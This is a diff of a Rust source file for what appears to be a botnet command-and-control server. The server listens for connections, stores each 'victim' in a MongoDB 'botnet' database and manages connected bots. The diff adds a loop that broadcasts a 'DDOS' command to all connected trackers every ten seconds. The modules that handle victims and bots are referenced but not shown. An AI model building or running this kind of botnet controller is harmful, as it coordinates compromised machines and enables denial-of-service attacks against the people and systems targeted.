@@ -1,51 +1,62 @@
+#[macro_use]
+extern crate log;
+
+use std::{env, net::SocketAddr, thread};
+use std::time::Duration;
+
+use mongodb::{Client, Collection, options::ClientOptions};
+use mongodb::bson::doc;
+use tokio::net::{TcpListener, TcpStream};
+use tokio::sync::broadcast;
+use tokio::sync::broadcast::Receiver;
+
+use victim::{Victim, VictimDb, VictimType};
+
 mod tracker;
 mod victim;
 mod bot;
 
-#[macro_use]
-extern crate log;
-
-use std::time::Duration;
-use std::{thread, net::SocketAddr, env};
-use tokio::net::{TcpListener, TcpStream};
-
-use mongodb::{options::ClientOptions, Client, Collection};
-use mongodb::bson::doc;
-
-use tokio::sync::broadcast::{self, Receiver};
-use victim::{VictimDb, Victim, VictimType};
-
 #[tokio::main]
 async fn main() {
+
+    // Initiate logging
     if env::var("RUST_LOG").is_err() {
         env::set_var("RUST_LOG", "debug");
     }
     env_logger::init();
-    let listener = TcpListener::bind("192.168.0.12:9570").await.unwrap();
+
+    // Bind port
+    let listener = TcpListener::bind("192.168.1.29:9570").await.unwrap();
+
+    // Connect to the database
     let options = ClientOptions::parse("mongodb://127.0.0.1:27017/").await.unwrap();
-    let client = Client::with_options(options).unwrap();
-    let (tx, _) = broadcast::channel::<String>(16);
+    let db_client = Client::with_options(options).unwrap();
+
+    // Channel to send a message to all trackers
+    let (tx, rx) = broadcast::channel(1);
 
     info!("Server started");
-    let tx1 = tx.clone();
+
     tokio::spawn(async move {
-        // tx1.send("COMMAND".to_string()).expect("Mauvaise commande");
-        // tx1.send("COMMAND".to_string()).unwrap();
-        thread::sleep(Duration::from_secs(10));
+        loop {
+            thread::sleep(Duration::from_secs(10));
+            debug!("Sending test message to trackers");
+            tx.send("DDOS 192.168.1.29\r\n").expect("huh");
+        }
     });
+
     loop {
         let (mut stream, addr) = listener.accept().await.unwrap();
 
         info!("Connection established");
-        let client = client.clone();
-        let tx = tx.clone();
+        let client = db_client.clone();
+        let rx2 = rx.resubscribe();
         tokio::spawn(async move {
             let victims_collection = client.database("botnet").collection::<VictimDb>("victims");
             let victim = victim::check_connection(&mut stream, &addr).await;
             if let Some(mut victim) = victim {
                 insert_victim_db(&victim, &addr, &victims_collection).await;
-                let receiver = tx.subscribe();
-                manage_victim(&mut victim, &mut stream, &victims_collection, receiver).await;
+                manage_victim(&mut victim, &mut stream, &victims_collection, rx2).await;
                 info!("The victim: {} disconnected", &victim.ip.ip());
             } else {
                 info!("{} tried to establish a connection but failed the test", addr.ip().to_string());
@@ -54,11 +65,11 @@ async fn main() {
     }
 }
 
-async fn manage_victim(victim: &mut Victim, mut stream: &mut TcpStream, victims_collection: &Collection<VictimDb>, receiver: Receiver<String>) {
-    victim.victim_type = VictimType::Bot;
+/// Connects a victim to the server and let it know what type it is
+async fn manage_victim(victim: &mut Victim, stream: &mut TcpStream, victims_collection: &Collection<VictimDb>, receiver: Receiver<&str>) {
     match victim.victim_type {
         VictimType::Bot => {
-            if let Err(err) = bot::manage_bot(&victim, &mut stream, &victims_collection).await {
+            if let Err(err) = bot::manage_bot(&victim, stream, &victims_collection).await {
                 error!("Error while communicating with the bot: {}", err);
             }
         },
@@ -71,6 +82,7 @@ async fn manage_victim(victim: &mut Victim, mut stream: &mut TcpStream, victims_
     victim.update_status(&victims_collection, false).await.ok();
 }
 
+/// Inserts a victim into the database, if the victim is already known update its status to active
 async fn insert_victim_db(victim: &Victim, addr: &SocketAddr, victims_collection: &Collection<VictimDb>) {
     let filter = doc! { "ip": addr.ip().to_string() };
     let find_victim = victims_collection.find_one(filter, None).await;
@@ -93,3 +105,4 @@ async fn insert_victim_db(victim: &Victim, addr: &SocketAddr, victims_collection
         error!("Failed to update victim's active status to true: {}", err);
     }
 }
+
